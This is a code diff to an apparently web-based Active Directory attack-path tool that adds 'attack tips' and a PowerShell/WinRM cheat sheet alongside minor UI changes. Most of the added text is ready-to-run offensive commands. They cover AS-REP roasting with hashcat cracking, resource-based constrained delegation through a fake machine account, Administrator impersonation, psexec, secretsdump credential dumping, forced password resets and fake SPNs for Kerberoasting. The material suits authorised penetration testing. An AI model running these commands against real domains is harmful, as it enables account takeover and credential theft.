@@ -67,6 +67,8 @@ ATTACK_TIPS = {
 'ForceChangePassword': """=== CORE IDEA ===
 # Reset TARGET user's password without knowing the current password.
 # This changes the account state and can break services if TARGET is a service account.
+# If TARGET is a computer account (especially a DC/RODC), password reset may break the secure channel / machine trust.
+# In that context this is usually a destructive side path, not the primary abuse route.
 
 === RESET PASSWORD ===
 # bloodyAD with explicit credentials:
@@ -349,15 +351,27 @@ SOURCE: https://bloodhound.specterops.io/resources/edges/all-extended-rights""",
 
 'WriteAccountRestrictions': """=== CORE IDEA ===
 # WriteAccountRestrictions can modify account restriction attributes on TARGET.
-# The important BloodHound abuse is writing msDS-AllowedToActOnBehalfOfOtherIdentity -> RBCD.
-# Destination is normally a computer object. The delegating account must have an SPN.
+# In BloodHound this edge is traversable, but the useful abuse depends heavily on TARGET type.
 
-=== RBCD WITH A CONTROLLED COMPUTER ===
+=== TARGET = USER ===
+# Common abuse: enable AS-REP roasting by adding the DONT_REQ_PREAUTH flag to TARGET.
+# Then request an AS-REP for offline cracking.
+bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add uac TARGET -f DONT_REQ_PREAUTH
+impacket-GetNPUsers DOMAIN/TARGET -dc-ip DC_IP -no-pass -request
+hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Cleanup if needed:
+bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP remove uac TARGET -f DONT_REQ_PREAUTH
+
+=== TARGET = COMPUTER ===
+# High-value abuse: write msDS-AllowedToActOnBehalfOfOtherIdentity -> RBCD.
+# The delegating account must have an SPN; computer accounts naturally do.
+
 # 1. Create a controlled computer if you do not already own an SPN-bearing account:
-impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP DOMAIN/USER:PASS
+bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add computer FAKE01 'FakePass123!'
 
 # 2. Allow FAKE01$ to act on behalf of other users to TARGET$:
-impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
+bloodyAD -d DOMAIN -u USER -p PASS -H DC_IP add rbcd TARGET FAKE01$
 
 # 3. Request a service ticket as a delegable user to TARGET:
 impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -dc-ip DC_IP DOMAIN/'FAKE01$':'FakePass123!'
@@ -368,7 +382,9 @@ impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN
 impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
 
 === CHECKS / LIMITS ===
-# Protected Users or accounts marked sensitive for delegation cannot be impersonated.
+# For user targets, the exact writable account-control flags matter; AS-REP roast is the usual practical branch.
+# For computer targets, RBCD is the branch BloodHound most commonly implies here.
+# Protected Users or accounts marked sensitive for delegation cannot be impersonated through RBCD.
 # If MachineAccountQuota is 0, use an already-controlled SPN-bearing account instead of creating FAKE01$.
 SOURCE: https://bloodhound.specterops.io/resources/edges/write-account-restrictions""",
 
@@ -721,6 +737,75 @@ export KRB5CCNAME=EXISTING_USER.ccache
 impacket-psexec -k -no-pass DOMAIN/EXISTING_USER@TARGET_HOST
 impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/EXISTING_USER@DC_HOST -dc-ip DC_IP
 SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden""",
+
+'PSNativeActions': """=== RSAT / ACTIVEDIRECTORY MODULE ===
+# Load the native AD module if RSAT is present:
+Import-Module ActiveDirectory
+
+# Reset a user's password:
+Set-ADAccountPassword -Identity TARGET -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+
+# Add a user to a group:
+Add-ADGroupMember -Identity TARGET_GROUP -Members USER
+
+# Enable AS-REP roasting on a user:
+Set-ADAccountControl -Identity TARGET -DoesNotRequirePreAuth $true
+
+# Quick checks:
+Get-ADUser TARGET -Properties servicePrincipalName,userAccountControl,memberOf
+Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity""",
+
+'PSPowerViewActions': """=== POWERVIEW SHORTCUTS ===
+# Dot-source PowerView in the current session:
+. .\\PowerView.ps1
+
+# Enumerate useful user / computer properties:
+Get-DomainUser TARGET -Properties serviceprincipalname,useraccountcontrol,memberof
+Get-DomainComputer TARGET -Properties msds-allowedtoactonbehalfofotheridentity
+
+# Reset a user's password:
+Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+
+# Add a user to a group:
+Add-DomainGroupMember -Identity TARGET_GROUP -Members USER
+
+# Add a fake SPN for targeted Kerberoast:
+Set-DomainObject -Identity TARGET -Set @{'serviceprincipalname'='fake/TARGET'}
+
+# Review ACLs on an object:
+Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs""",
+
+'PSRBCDPrep': """=== POWERMAD + POWERVIEW (RBCD PREP) ===
+# Create a machine account from Windows if MachineAccountQuota allows it:
+Import-Module .\\Powermad.ps1
+New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+
+# Prepare an RBCD security descriptor for FAKE01$ on TARGET$:
+. .\\PowerView.ps1
+$Sid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$Sid)\"
+$Bytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($Bytes,0)
+Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$Bytes}
+
+# RBCD ticket request / service use is still usually cleaner with Impacket from Linux.""",
+
+'PSWinRMEnum': """=== WINRM SESSION HELPERS ===
+# Confirm context, groups, tickets, and DC:
+whoami /all
+klist
+nltest /dsgetdc:DOMAIN
+
+# Native AD module quick survey:
+Import-Module ActiveDirectory
+Get-ADDomain
+Get-ADGroup 'Remote Management Users' -Properties member
+Get-ADComputer TARGET -Properties operatingSystem,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# PowerView alternatives:
+. .\\PowerView.ps1
+Get-DomainUser -AdminCount | select samaccountname
+Get-DomainComputer | select dnshostname,operatingsystem""",
 
 'Timeroast': """=== CORE IDEA ===
 # Timeroast abuses MS-SNTP responses from machine accounts to collect crackable hashes.
@@ -1806,6 +1891,10 @@ let CFG = {
   dc_ip: '', dc_host: '', domain: '', user: '', pass: '',
   hash: '', ccache: '', target: '', proxy: '',
 };
+let CFG_AUTO = {
+  dc_ip: '',
+  domain: '',
+};
 
 // ── CONFIG FUNCTIONS ──
 function toggleCfg() {
@@ -1834,26 +1923,31 @@ function applyConfig() {
   renderCurrentTab();
 }
 
+function setAutoConfigField(field, nextValue) {
+  if (!nextValue) return;
+  const el = document.getElementById('cfg_' + field);
+  const currentInput = el ? el.value.trim() : (CFG[field] || '');
+  const prevAuto = CFG_AUTO[field] || '';
+  const canReplace = !currentInput || currentInput === prevAuto;
+  if (!canReplace) return;
+
+  CFG[field] = nextValue;
+  CFG_AUTO[field] = nextValue;
+  if (el) el.value = nextValue;
+  cfgChanged();
+}
+
 function autoFillConfig(domain) {
-  // Called after ZIP upload — fill domain if not already set
-  if (!CFG.domain && domain && domain !== '?') {
-    CFG.domain = domain.toLowerCase();
-    const el = document.getElementById('cfg_domain');
-    if (el && !el.value) {
-      el.value = CFG.domain;
-      cfgChanged();
-    }
+  // Called after ZIP upload — refresh auto-fill values but preserve manual edits
+  if (domain && domain !== '?') {
+    setAutoConfigField('domain', domain.toLowerCase());
   }
   // Try to parse DC IP from filename if stored
   if (S._filename) {
     const m = S._filename.match(/(\d{1,3}_\d{1,3}_\d{1,3}_\d{1,3})/);
     if (m) {
       const ip = m[1].replace(/_/g, '.');
-      if (!CFG.dc_ip) {
-        CFG.dc_ip = ip;
-        const el = document.getElementById('cfg_dc_ip');
-        if (el && !el.value) { el.value = ip; cfgChanged(); }
-      }
+      setAutoConfigField('dc_ip', ip);
     }
   }
 }
@@ -2226,6 +2320,10 @@ function formatTip(right, raw) {
     GetChangesInFilteredSet: 'CONTEXT',
     ProtectedGroup: 'CONSTRAINT',
     RemoteManagementUsers: 'ACCESS',
+    PSNativeActions: 'WINRM',
+    PSPowerViewActions: 'WINRM',
+    PSRBCDPrep: 'WINRM',
+    PSWinRMEnum: 'WINRM',
   };
   const label = labelByRight[right] || 'EXPLOIT';
   return `<div class="chain-tip"><span class="tip-label">// ${label} - ${escHtml(right)}</span>${html}${srcHtml}</div>`;
@@ -2462,6 +2560,32 @@ function renderDelegExtra() {
       ${formatTip('Timeroast', G_EDGE_TIPS.Timeroast)}
     </div>`;
   }
+
+  extra += `<div class="sec" style="margin-top:18px">
+    <div class="sec-title">🖥 PowerShell / WinRM Cheat Sheet</div>
+    <div style="color:var(--dim);font-size:.8em;line-height:1.7;margin-bottom:10px">
+      Practical Windows-side alternatives for the cases where PowerShell is actually pleasant to use.
+      Linux tooling like Impacket / Certipy is still the cleaner route for many Kerberos and certificate abuse paths.
+    </div>
+    <div class="deleg-grid">
+      <div class="dbox">
+        <h4>Account & Group Actions</h4>
+        ${formatTip('PSNativeActions', G_EDGE_TIPS.PSNativeActions)}
+      </div>
+      <div class="dbox">
+        <h4>PowerView Shortcuts</h4>
+        ${formatTip('PSPowerViewActions', G_EDGE_TIPS.PSPowerViewActions)}
+      </div>
+      <div class="dbox">
+        <h4>RBCD Prep</h4>
+        ${formatTip('PSRBCDPrep', G_EDGE_TIPS.PSRBCDPrep)}
+      </div>
+      <div class="dbox">
+        <h4>WinRM Session Helpers</h4>
+        ${formatTip('PSWinRMEnum', G_EDGE_TIPS.PSWinRMEnum)}
+      </div>
+    </div>
+  </div>`;
 
   if (extra) {
     const cont = document.getElementById('content');
@@ -3368,7 +3492,8 @@ function drawGraph(nodes, links, container) {
     .attr('r', d=>(G_NODE_RADIUS[d.type]||14)+6)
     .attr('fill','none')
     .attr('stroke', d=>d.owned?'#00ff88':'#ff2244')
-    .attr('stroke-width',1.2).attr('opacity',.3);
+    .attr('stroke-width',1.2).attr('opacity',.3)
+    .attr('pointer-events','none');
 
   // Main circle
   nodeGs.append('circle').attr('class','g-mc')
